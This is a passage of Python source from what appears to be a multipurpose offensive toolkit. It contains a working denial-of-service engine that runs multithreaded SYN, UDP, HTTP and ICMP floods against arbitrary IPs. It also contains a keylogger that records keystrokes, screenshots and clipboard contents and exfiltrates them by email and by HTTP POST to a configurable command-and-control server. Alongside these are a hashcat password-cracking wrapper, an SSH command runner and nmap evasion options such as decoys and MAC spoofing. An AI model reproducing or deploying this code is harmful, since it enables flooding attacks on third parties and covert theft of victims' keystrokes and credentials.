            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "AWESOME-EMU"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        """DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        """ARP request"""
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        """Mixed traffic"""
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        """Random traffic"""
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        """Get local MAC address"""
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active generators"""
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    """DOS attack engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """SYN flood attack"""
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """UDP flood attack"""
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        """HTTP flood attack"""
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        """ICMP flood attack"""
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        """Execute attack"""
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        """Get attack function"""
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        """Send SYN packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        """Send UDP packets"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        """Send HTTP requests"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "AWESOME-EMU"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        """Send ICMP packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        """Stop attack"""
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active attacks"""
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# KEYLOGGER ENGINE
# =====================
class KeyloggerEngine:
    """Keylogger engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        """Start keylogger"""
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        """Stop keylogger"""
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        """Handle key press"""
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        """Save keylog"""
        if self.text:
            timestamp = datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        """Take screenshot"""
        try:
            import pyautogui
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        """Monitor clipboard"""
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        """Exfiltrate data"""
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        """Exfiltrate to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        """Exfiltrate via email"""
        try:
            smtp_server = self.config.get('email.smtp_server', '')
            smtp_port = self.config.get('email.smtp_port', 587)
            smtp_username = self.config.get('email.smtp_username', '')
            smtp_password = self.config.get('email.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        """Exfiltrate via C2"""
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        """Exfiltrate clipboard"""
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        """Upload keylog periodically"""
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        """Get keylogs"""
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        """Get screenshots"""
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        """Check if SSH is available"""
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        """Add SSH connection"""
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        """Connect to SSH server"""
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        """Disconnect from SSH server"""
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        """Execute command over SSH"""
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        """Get SSH connections"""
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    """Password cracking engine"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', os.path.join(WORDLISTS_DIR, "rockyou.txt"))
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        """Start cracking a hash"""
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        """Run hashcat"""
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        """Get hashcat hash type number"""
        hash_types = {
            'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
            'ntlm': 1000, 'mysql': 200, 'mysql5': 300, 'postgres': 12,
            'mssql': 131, 'oracle': 3100, 'bcrypt': 3200, 'scrypt': 8900,
            'md5_utf8': 10, 'sha1_utf8': 110, 'sha256_utf8': 1410, 'sha512_utf8': 1710
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        """Crack with Python fallback"""
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        """Get cracking job status"""
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        """Get all cracking jobs"""
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    """Docker security scanner"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        """Scan Docker image"""
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        """Parse vulnerabilities from output"""
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line or 'LOW' in line:
                severity = 'critical' if 'CRITICAL' in line else 'high' if 'HIGH' in line else 'medium' if 'MEDIUM' in line else 'low'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        """Determine overall severity"""
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'
    
    def docker_info(self) -> Dict:
        """Get Docker info"""
        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_ps(self) -> Dict:
        """List Docker containers"""
        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_images(self) -> Dict:
        """List Docker images"""
        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Main command handler"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.tools = NetworkTools()
        self.social = SocialEngineeringTools(db)
        self.traffic = TrafficGeneratorEngine(db)
        self.dos = DOSEngine(db, config)
        self.keylogger = KeyloggerEngine(db, config) if PYNPUT_AVAILABLE else None
        self.ssh = SSHManager(db) if PARAMIKO_AVAILABLE else None
        self.cracking = CrackingEngine(db, config)
        self.docker = DockerScanner(db)
        
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        """Build command dictionary"""
        commands = {
            # System commands
            'help': self._help,
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'clear': self._clear,
            'version': self._version,
            
            # Ping commands
            'ping': self._ping,
            'ping_count': self._ping_count,
            'ping_flood': self._ping_flood,
            'ping_size': self._ping_size,
            'ping_interval': self._ping_interval,
            'ping_timeout': self._ping_timeout,
            'ping_ttl': self._ping_ttl,
            'ping_interface': self._ping_interface,
            'ping_source': self._ping_source,
            'ping_pattern': self._ping_pattern,
            'ping_record': self._ping_record,
            'ping_timestamp': self._ping_timestamp,
            'ping_quiet': self._ping_quiet,
            'ping_verbose': self._ping_verbose,
            'ping_ipv6': self._ping_ipv6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_mtu': self._ping_mtu,
            'ping_deadline': self._ping_deadline,
            'ping_numeric': self._ping_numeric,
            'ping_adaptive': self._ping_adaptive,
            'ping_audible': self._ping_audible,
            
            # Traceroute commands
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            'tracepath': self._tracepath,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_first_hop': self._traceroute_first_hop,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_wait': self._traceroute_wait,
            'traceroute_port': self._traceroute_port,
            'traceroute_numeric': self._traceroute_numeric,
            'traceroute_verbose': self._traceroute_verbose,
            'mtr': self._mtr,
            'mtr_json': self._mtr_json,
            'mtr_csv': self._mtr_csv,
            'tcptraceroute': self._tcptraceroute,
            'traceroute_ipv6': self._traceroute_ipv6,
            
            # Nmap commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_service': self._nmap_service,
            'nmap_os': self._nmap_os,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_comprehensive': self._nmap_comprehensive,
            'nmap_ping': self._nmap_ping,
            'nmap_ports': self._nmap_ports,
            'nmap_script': self._nmap_script,
            'nmap_output': self._nmap_output,
            'nmap_exclude': self._nmap_exclude,
            'nmap_input': self._nmap_input,
            'nmap_random': self._nmap_random,
            'nmap_timing': self._nmap_timing,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_version': self._nmap_version,
            'nmap_help': self._nmap_help,
            'nmap_syn': self._nmap_syn,
            'nmap_connect': self._nmap_connect,
            'nmap_ack': self._nmap_ack,
            'nmap_fin': self._nmap_fin,
            'nmap_xmas': self._nmap_xmas,
            'nmap_null': self._nmap_null,
            'nmap_script_default': self._nmap_script_default,
            'nmap_top_ports': self._nmap_top_ports,
            'nmap_open': self._nmap_open,
            'nmap_reason': self._nmap_reason,
            'nmap_packet_trace': self._nmap_packet_trace,
            'nmap_iflist': self._nmap_iflist,
            'nmap_no_ping': self._nmap_no_ping,
            'nmap_fast': self._nmap_fast,
            'nmap_fragment': self._nmap_fragment,
            'nmap_decoys': self._nmap_decoys,
            'nmap_source_port': self._nmap_source_port,
            'nmap_data_length': self._nmap_data_length,
            'nmap_ttl': self._nmap_ttl,
            'nmap_spoof_mac': self._nmap_spoof_mac,
            'nmap_badsum': self._nmap_badsum,
            'nmap_send_eth': self._nmap_send_eth,
            'nmap_send_ip': self._nmap_send_ip,
            
            # Curl commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_output': self._curl_output,
            'curl_remote_name': self._curl_remote_name,
            'curl_location': self._curl_location,
            'curl_include': self._curl_include,
            'curl_verbose': self._curl_verbose,
            'curl_silent': self._curl_silent,
            'curl_show_error': self._curl_show_error,
            'curl_fail': self._curl_fail,
            'curl_insecure': self._curl_insecure,
            'curl_data': self._curl_data,
            'curl_data_binary': self._curl_data_binary,
            'curl_data_urlencode': self._curl_data_urlencode,
            'curl_form': self._curl_form,
            'curl_header': self._curl_header,
            'curl_user_agent': self._curl_user_agent,
            'curl_referer': self._curl_referer,
            'curl_user': self._curl_user,
            'curl_cookie': self._curl_cookie,
            'curl_cookie_jar': self._curl_cookie_jar,
            'curl_proxy': self._curl_proxy,
            'curl_cert': self._curl_cert,
            'curl_key': self._curl_key,
            'curl_cacert': self._curl_cacert,
            'curl_tlsv1_2': self._curl_tlsv1_2,
            'curl_tlsv1_3': self._curl_tlsv1_3,
            'curl_continue': self._curl_continue,
            'curl_range': self._curl_range,
            'curl_limit_rate': self._curl_limit_rate,
            'curl_max_time': self._curl_max_time,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_retry': self._curl_retry,
            'curl_ipv4': self._curl_ipv4,
            'curl_ipv6': self._curl_ipv6,
            'curl_interface': self._curl_interface,
            'curl_http2': self._curl_http2,
            'curl_compressed': self._curl_compressed,
            'curl_write_out': self._curl_write_out,
            'curl_dump_header': self._curl_dump_header,
            'curl_trace': self._curl_trace,
            'curl_json': self._curl_json,
            'curl_help': self._curl_help,
            'curl_version': self._curl_version,
            'curl_parallel': self._curl_parallel,
            'curl_config': self._curl_config,
            'curl_next': self._curl_next,
            'curl_styled': self._curl_styled,
            'curl_progress': self._curl_progress,
            
            # Wget commands
            'wget': self._wget,
            'wget_output': self._wget_output,
            'wget_continue': self._wget_continue,
            'wget_background': self._wget_background,
            'wget_quiet': self._wget_quiet,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_spider': self._wget_spider,
            'wget_input': self._wget_input,
            'wget_header': self._wget_header,
            'wget_user_agent': self._wget_user_agent,
            'wget_referer': self._wget_referer,
            'wget_cookies': self._wget_cookies,
            'wget_save_cookies': self._wget_save_cookies,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_retry': self._wget_retry,
            'wget_no_check_cert': self._wget_no_check_cert,
            'wget_certificate': self._wget_certificate,
            'wget_private_key': self._wget_private_key,
            'wget_ca_certificate': self._wget_ca_certificate,
            'wget_proxy': self._wget_proxy,
            'wget_no_proxy': self._wget_no_proxy,
            'wget_user': self._wget_user,
            'wget_password': self._wget_password,
            'wget_post_data': self._wget_post_data,
            'wget_post_file': self._wget_post_file,
            'wget_method': self._wget_method,
            'wget_timestamping': self._wget_timestamping,
            'wget_no_clobber': self._wget_no_clobber,
            'wget_delete_after': self._wget_delete_after,
            'wget_progress': self._wget_progress,
            'wget_show_progress': self._wget_show_progress,
            'wget_config': self._wget_config,
            'wget_append_output': self._wget_append_output,
            'wget_output_file': self._wget_output_file,
            'wget_no_parent': self._wget_no_parent,
            'wget_cut_dirs': self._wget_cut_dirs,
            'wget_directory_prefix': self._wget_directory_prefix,
            'wget_convert_links': self._wget_convert_links,
            'wget_backup_converted': self._wget_backup_converted,
            'wget_adjust_extension': self._wget_adjust_extension,
            'wget_restrict_file_names': self._wget_restrict_file_names,
            'wget_trust_server_names': self._wget_trust_server_names,
            'wget_content_disposition': self._wget_content_disposition,
            'wget_random_wait': self._wget_random_wait,
            'wget_wait': self._wget_wait,
            'wget_waitretry': self._wget_waitretry,
            'wget_quota': self._wget_quota,
